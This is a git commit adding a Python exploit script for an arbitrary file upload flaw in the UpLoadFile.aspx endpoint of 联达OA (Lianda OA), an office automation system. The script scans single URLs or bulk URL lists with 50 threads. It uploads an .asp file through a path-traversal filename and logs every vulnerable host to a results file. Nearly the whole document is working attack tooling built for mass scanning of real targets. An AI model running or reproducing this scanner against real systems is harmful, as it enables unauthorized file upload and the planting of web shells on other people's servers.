9c6fe88dd050aeca9b0340ca09ea6eb832ed74de
cx3301433 <168405637+cx3301433@users.noreply.github.com>
2024-06-30 23:17:09 +0800

    Add files via upload

---
+++ 联达OA UpLoadFile.aspx接口存在任意文件上传漏洞/liandaOA.py
@@ -0,0 +1,98 @@
+# 联达OA UpLoadFile.aspx接口存在任意文件上传漏洞
+import argparse,sys,requests
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()
+import time
+
+#定义横幅
+
+
+def banner():
+    banner = """
+██╗     ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗  █████╗ 
+██║     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗██╔══██╗
+██║     ██║███████║██╔██╗ ██║██║  ██║███████║██║   ██║███████║
+██║     ██║██╔══██║██║╚██╗██║██║  ██║██╔══██║██║   ██║██╔══██║
+███████╗██║██║  ██║██║ ╚████║██████╔╝██║  ██║╚██████╔╝██║  ██║
+╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
+                                                version:联达OA
+
+
+"""
+    print(banner)
+
+
+#定义主函数
+def main():
+    #调用横幅
+    banner()
+    #argparse模块处理命令行参数
+    parser = argparse.ArgumentParser(description="联达OA UpLoadFile.aspx接口存在任意文件上传漏洞")
+    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
+    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
+    args = parser.parse_args()
+    #如果用户输入url而不是file时：
+    if args.url and not args.file:
+        poc(args.url)
+        # if poc(args.url):
+        #     exp(args.url)
+    #如果用户输入file而不是url时：
+    elif args.file and not args.url:
+        url_list=[]
+        with open(args.file,mode='r',encoding='utf-8') as fr:
+            for i in fr.readlines():
+                url_list.append(i.strip().replace('\n',''))
+                # print(url_list)    
+                #设置多线程 
+        mp = Pool(50)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+    #如果用户输入的既不是url也不是file时：
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+             
+#定义poc
+def poc(target):
+    payload = '/FileManage/UpLoadFile.aspx'
+    url = target+payload
+    header = {
+        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
+        "Accept-Encoding": "gzip, deflate",
+        "Accept": "*/*",
+        "Connection": "keep-alive",
+        "Content-Length": "270",
+        "Content-Type": "multipart/form-data; boundary=07800d96bad08d24dd59e3285dc16968",
+            }
+    data = (
+        "--07800d96bad08d24dd59e3285dc16968\r\n"
+        'Content-Disposition: form-data; name="file"; filename="../test1.asp"\r\n'
+        'Content-Type: image/png\r\n'
+        "\r\n"
+        'tteesstt1\r\n'
+        "--07800d96bad08d24dd59e3285dc16968\r\n"
+        'Content-Disposition: form-data; name="DesignId"\r\n'
+        "\r\n"
+        '1\r\n'
+        "--07800d96bad08d24dd59e3285dc16968--\r\n"
+    )
+    #请求网页
+    try:
+        re = requests.get(url=target,headers=header,verify=False)
+        if re.status_code == 200 : 
+            res1 = requests.post(url=url,headers=header,data=data,verify=False)
+            if res1.status_code == 200 and '文件上传成功' in res1.text:   
+                print(f'[+++]该{target}存在漏洞')
+                with open('result.txt',mode='a',encoding='utf-8')as ft:
+                    ft.write(target+'\n')
+                return True
+            else:
+                print(f'该{target}不存在该漏洞')
+            return False
+    except:
+        print(f'该{target}存在问题，请手动测试')
+        return False
+
+
+if __name__ == '__main__':
+    main()
